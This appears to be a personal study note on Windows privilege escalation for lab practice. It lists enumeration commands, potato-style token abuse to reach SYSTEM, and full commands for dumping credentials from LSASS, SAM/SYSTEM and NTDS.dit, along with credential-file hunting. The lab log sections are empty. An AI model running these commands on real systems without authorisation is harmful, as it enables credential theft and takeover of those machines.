# Windows Privilege Escalation

> Status: 🟨 In progress
> Date started: 2026-10-26
> Date finished: 

## 1. Goal
Escalate from a low-priv Windows user (or service) to SYSTEM/Administrator by abusing privileges, services, credentials and misconfigurations.

## Initial enumeration
```powershell
whoami /priv ; whoami /groups           # privileges + group SIDs (THE key check)
systeminfo ; wmic qfe                    # OS/patch level -> missing-patch exploits
set ; echo %USERNAME%
tasklist /svc ; query user
net user ; net localgroup administrators ; net accounts
ipconfig /all ; arp -a ; route print ; netstat -ano
Get-MpComputerStatus                      # Defender
Get-AppLockerPolicy -Effective | select -Expand RuleCollections
gci \\.\pipe\                             # named pipes (potato/relay targets)
accesschk.exe /accepteula \\.\Pipe\lsass -v
```
Automate with **winPEAS** / **PowerUp** (`Invoke-AllChecks`) / **Seatbelt**.

## Token privilege abuse (the main service->SYSTEM path)
`whoami /priv` is the first thing to read. The gold ones:
| Privilege | Abuse |
|---|---|
| **SeImpersonate / SeAssignPrimaryToken** | "potato" attacks -> SYSTEM: **PrintSpoofer**, **GodPotato**, JuicyPotato (older) |
| **SeBackup / SeRestore** | read any file -> copy SAM+SYSTEM or NTDS.dit |
| **SeTakeOwnership** | take ownership of a file/registry key -> read/replace it |
| **SeDebug** | open any process -> dump LSASS |
```text
# SeImpersonate (service accounts, IIS, MSSQL) -> SYSTEM:
PrintSpoofer.exe -i -c cmd         # -c runs a command as SYSTEM (reverse-shell payload not stored)
# GodPotato.exe -cmd "cmd /c whoami"  (modern equivalent for newer Windows)
```
Service accounts (IIS `iis apppool\...`, MSSQL via `xp_cmdshell`) almost always have SeImpersonate -> instant SYSTEM. This is the #1 Windows service-to-SYSTEM move.

## Credential dumping
```text
# LSASS (plaintext creds / NTLM hashes) - needs admin/SeDebug
procdump.exe -accepteula -ma lsass.exe lsass.dmp     # dump offline (quieter than mimikatz live)
# mimikatz: sekurlsa::minidump lsass.dmp  ->  sekurlsa::logonpasswords
# SAM/SYSTEM (local hashes)
reg save HKLM\SAM sam ; reg save HKLM\SYSTEM system   # secretsdump.py -sam sam -system system LOCAL
# NTDS.dit (all domain hashes, on a DC - with SeBackup or admin)
robocopy /B E:\Windows\NTDS\ ntds ntds.dit
secretsdump.py -ntds ntds.dit -system SYSTEM LOCAL
```

## Credential hunting (files / history)
```powershell
findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml
gc (Get-PSReadLineOption).HistorySavePath          # PowerShell history
$cred = Import-Clixml 'C:\path\pass.xml'           # saved PSCredential (reversible!)
# also: unattend.xml, web.config, saved browser creds, cmdkey /list
```

## Misc privesc vectors (more detail to come)
- **DLL hijacking** - writable dir in a service's DLL search path -> drop a malicious DLL (incl. DNS `ServerLevelPluginDll` on a DC-DNS admin -> SYSTEM).
- **ACL / takeown** on sensitive files: `takeown /f <file>` + `icacls <file> /grant <me>:F` -> read configs/creds.
- **Unquoted service paths, weak service perms, AlwaysInstallElevated** - classic service misconfigs (next sections).

> Read `whoami /priv` first, every time. **SeImpersonate -> PrintSpoofer/GodPotato -> SYSTEM** is the single most common Windows privesc, because service accounts (web/DB) have it by default.

## My notes / lab output
Filled in as I run these on lab targets.

## 2. Setup
- Attack box: (Pwnbox / Kali VM)
- Target(s): `<TARGET_IP>` (placeholders only, no real lab IPs)

## 3. Commands I used
Each block says which machine it ran on.

```bash
# [ATTACK BOX]

```

```bash
# [TARGET]

```

## 4. Confirmed (what worked)
- 

## 5. Tried, didn't work (and why)
- 

## 6. Open questions / revisit
- 

## 7. Cheat sheet lines
Copied into `cheatsheets/`:
- 
